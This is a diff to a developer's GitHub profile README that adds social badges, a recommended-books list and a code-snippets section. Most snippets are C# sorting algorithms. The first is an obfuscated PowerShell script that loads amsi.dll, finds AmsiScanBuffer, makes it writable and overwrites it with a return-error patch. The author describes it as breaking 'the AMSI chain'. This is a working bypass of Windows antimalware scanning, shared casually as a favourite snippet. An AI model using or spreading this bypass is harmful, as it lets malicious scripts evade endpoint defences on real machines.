@@ -1,7 +1,32 @@
 <h3 align="center" style="font-weight: bold;">Hello!👋 My name is Azrael</h3>
 <p align="center">
+  <a href="https://dev.to/LukeHjo">
+    <img src="https://img.shields.io/badge/Dev.to-black?style=flat-square&logo=dev.to" alt="Dev.to Badge"/>
+  </a>
+  <a href="https://github.com/luke-beep">
+    <img src="https://img.shields.io/badge/GitHub-black?style=flat-square&logo=github" alt="GitHub Badge"/>
+  </a>
+  <a href="https://twitter.com/LuckyLukeHjo">
+    <img src="https://img.shields.io/badge/Twitter-blue?style=flat-square&logo=twitter" alt="Twitter Badge"/>
+  </a>
+  <a href="https://www.youtube.com/@LukeHjo">
+    <img src="https://img.shields.io/badge/YouTube-red?style=flat-square&logo=youtube" alt="YouTube Badge"/>
+  </a>
+  <a href="https://hashnode.com/@LukeHjo">
+    <img src="https://img.shields.io/badge/Hashnode-2962FF?style=flat-square&logo=hashnode" alt="Hashnode Badge"/>
+  </a>
+  <a href="https://lukehjo.dev">
+    <img src="https://img.shields.io/badge/Portfolio-000000?style=flat-square&logo=react" alt="Portfolio Badge"/>
+  </a>
+  <a href="https://tech.lukehjo.dev">
+    <img src="https://img.shields.io/badge/Tech%20Blog-000000?style=flat-square&logo=react" alt="Tech Blog Badge"/>
+  </a>
+</p>
+<p align="center">
   <img src="assets/LukeHjo.gif" alt="My Github profile" />
 </p>
+
+---
 
 ### 🚀 Quick Navigation
 
@@ -15,6 +40,8 @@
 - [💡 Interests & Passions](#-interests)
 - [🗂️ Curated Lists](#-lists)
 - [🎨 Favorite Themes & Fonts](#-favorite-themes--fonts)
+- [📖 Recommended Books](#-recommended-books)
+- [💾 Code Snippets](#-code-snippets)
 - [📫 Contact & Connect](#-how-to-reach-me)
 - [🔍 The Meaning Behind 'Azrael'](#the-meaning-behind-azrael)
 
@@ -768,6 +795,249 @@ I have a particular interest for themes and fonts that enhance the coding experi
 These themes and fonts not only enhance the visual aspect of my development setup but also contribute to a more comfortable and productive coding experience.
 
 ---
+
+### 📖 Recommended Books
+
+I'm an avid reader, and I enjoy exploring a variety of genres, from fiction to non-fiction. Here are some of my favorite books.
+
+#### **[The Art of Computer Programming](https://www.goodreads.com/book/show/112247.The_Art_of_Computer_Programming_Volume_1)** 📖
+> A comprehensive guide to computer programming, covering a wide range of topics, including algorithms, data structures, and combinatorial algorithms.
+
+#### **[The C Programming Language](https://www.goodreads.com/book/show/515601.The_C_Programming_Language)** 📖
+> A classic book on C programming, covering the fundamentals of the language and its applications.
+
+#### **[Code Complete: Second Edition](https://www.goodreads.com/book/show/4845.Code_Complete)** 📖
+> A practical guide to software construction, covering the entire development process, from initial design to final testing.
+
+#### **[C# In Depth](https://www.goodreads.com/book/show/7789280-c-in-depth)** 📖
+> A comprehensive guide to C#, covering the language's history, syntax, and applications.
+
+#### **[Adaptive Code](https://www.amazon.com/Adaptive-Code-principles-Developer-Practices/dp/1509302581)** 📖
+> A practical guide to software construction, covering the entire development process, from initial design to final testing.
+
+#### **[The Pragmatic Programmer](https://www.goodreads.com/book/show/4099.The_Pragmatic_Programmer)** 📖
+> A practical guide to software construction, covering the entire development process, from initial design to final testing.
+
+#### **[Clean Code](https://www.goodreads.com/book/show/3735293-clean-code)** 📖
+> A practical guide to software construction, covering the entire development process, from initial design to final testing.
+
+---
+
+### 💾 Code Snippets 
+
+I enjoy exploring new technologies and experimenting with different tools. Here are some of my favorite code snippets.
+
+```powershell
+$_class = @" 
+using System;
+using System.Runtime.InteropServices;
+public class _class {
+    [DllImport("kernel32")]
+    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
+    [DllImport("kernel32")]
+    public static extern IntPtr LoadLibrary(string name);
+    [DllImport("kernel32")]
+    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr lnsgbs, uint flNewProtect, out uint lpflOldProtect);
+}
+"@
+
+Add-Type $_class
+$kkkk = 0
+$jjjj = [_class]::LoadLibrary("$(('àmsì'+'.dll').nORMaLiZe([chAR]([bYTE]0x46)+[chAr]([BYTE]0x6f)+[chAR]([bYte]0x72)+[chAR]([Byte]0x6d)+[cHar](68*38/38)) -replace [chAr]([byTE]0x5c)+[char](112*87/87)+[ChaR](94+29)+[CHAR](64+13)+[CHAr]([bytE]0x6e)+[CHAR](58+67))")# Replaces FormD characters with FormC characters
+$iiii = [_class]::GetProcAddress($jjjj, "$([char](6+59)+[char]([byte]0x6d)+[char](115*58/58)+[char](105+63-63)+[char](83)+[char](96+3)+[char](97)+[char](100+10)+[char](66*20/20)+[char](117)+[char](102*29/29)+[char]([byte]0x66)+[char]([byte]0x65)+[char](114+76-76))") # Get the address of the function with ProcAddress
+[_class]::VirtualProtect($iiii, [uint32]5, 0x40, [ref]$kkkk) 
+
+$aaaa = "0x"
+
+$cccc = $aaaa + "B" 
+
+
+$gggg = $aaaa + "5" 
+$cccc = $cccc + "8" 
+$ffff = $aaaa + "0" 
+$gggg = $gggg + "7" 
+$ffff = $ffff + "0" 
+$dddd = $aaaa + "8"     
+$eeee = $aaaa + "0" 
+$eeee = $eeee + "7" 
+$bbbb = $aaaa + "C" 
+$dddd = $dddd + "0" 
+$bbbb = $bbbb + "3" 
+
+
+$hhhh = [byte[]] ($cccc,$gggg,$ffff,$eeee,+$dddd,+$bbbb) 
+[System.Runtime.InteropServices.Marshal]::Copy($hhhh, 0, $iiii, 6)
+```
+> A simple powershell [script](https://gist.github.com/luke-beep/95f5774a21fb914a8a9950c46028e0bb) to break the AMSI chain.
+
+```csharp
+public static class BubbleSort
+{
+    public static void Execute(int[] data)
+    {
+        int n = data.Length;
+        for (int i = 0; i < n - 1; i++)
+        {
+            for (int j = 0; j < n - i - 1; j++)
+            {
+                if (data[j] <= data[j + 1])
+                {
+                    continue;
+                }
+
+                (data[j], data[j + 1]) = (data[j + 1], data[j]);
+            }
+        }
+    }
+}
+```
+> A simple C# implementation of the bubble sort algorithm.
+
+```csharp
+public static class InsertionSort
+{
+    public static void Execute(int[] data)
+    {
+        int n = data.Length;
+        for (int i = 1; i < n; ++i)
+        {
+            int key = data[i];
+            int j = i - 1;
+
+            while (j >= 0 && data[j] > key)
+            {
+                data[j + 1] = data[j];
+                j = j - 1;
+            }
+
+            data[j + 1] = key;
+        }
+    }
+}
+```
+> A simple C# implementation of the insertion sort algorithm.
+
+```csharp
+public static class MergeSort
+{
+    public static void Execute(int[] data)
+    {
+        int n = data.Length;
+        int[] temp = new int[n];
+        Sort(data, temp, 0, n - 1);
+    }
+
+    private static void Sort(int[] data, int[] temp, int left, int right)
+    {
+        if (left >= right)
+        {
+            return;
+        }
+
+        int mid = (left + right) / 2;
+        Sort(data, temp, left, mid);
+        Sort(data, temp, mid + 1, right);
+        Merge(data, temp, left, mid, right);
+    }
+
+    private static void Merge(int[] data, int[] temp, int left, int mid, int right)
+    {
+        int i = left;
+        int j = mid + 1;
+        int k = left;
+
+        while (i <= mid && j <= right)
+        {
+            if (data[i] <= data[j])
+            {
+                temp[k] = data[i];
+                i++;
+            }
+            else
+            {
+                temp[k] = data[j];
+                j++;
+            }
+
+            k++;
+        }
+
+        while (i <= mid)
+        {
+            temp[k] = data[i];
+            i++;
+            k++;
+        }
+
+        while (j <= right)
+        {
+            temp[k] = data[j];
+            j++;
+            k++;
+        }
+
+        for (k = left; k <= right; k++)
+        {
+            data[k] = temp[k];
+        }
+    }
+}
+```
+> A simple C# implementation of the merge sort algorithm.
+
+```csharp
+public static class QuickSort
+{
+    public static void Execute(int[] data)
+    {
+        int n = data.Length;
+        Sort(data, 0, n - 1);
+    }
+
+    private static void Sort(int[] data, int left, int right)
+    {
+        if (left >= right)
+        {
+            return;
+        }
+
+        int pivot = data[(left + right) / 2];
+        int index = Partition(data, left, right, pivot);
+        Sort(data, left, index - 1);
+        Sort(data, index, right);
+    }
+
+    private static int Partition(int[] data, int left, int right, int pivot)
+    {
+        while (left <= right)
+        {
+            while (data[left] < pivot)
+            {
+                left++;
+            }
+
+            while (data[right] > pivot)
+            {
+                right--;
+            }
+
+            if (left <= right)
+            {
+                (data[left], data[right]) = (data[right], data[left]);
+                left++;
+                right--;
+            }
+        }
+
+        return left;
+    }
+}
+```
+> A simple C# implementation of the quick sort algorithm.
+
+
+
+
 
 ### 📫 Contact & Connect
 
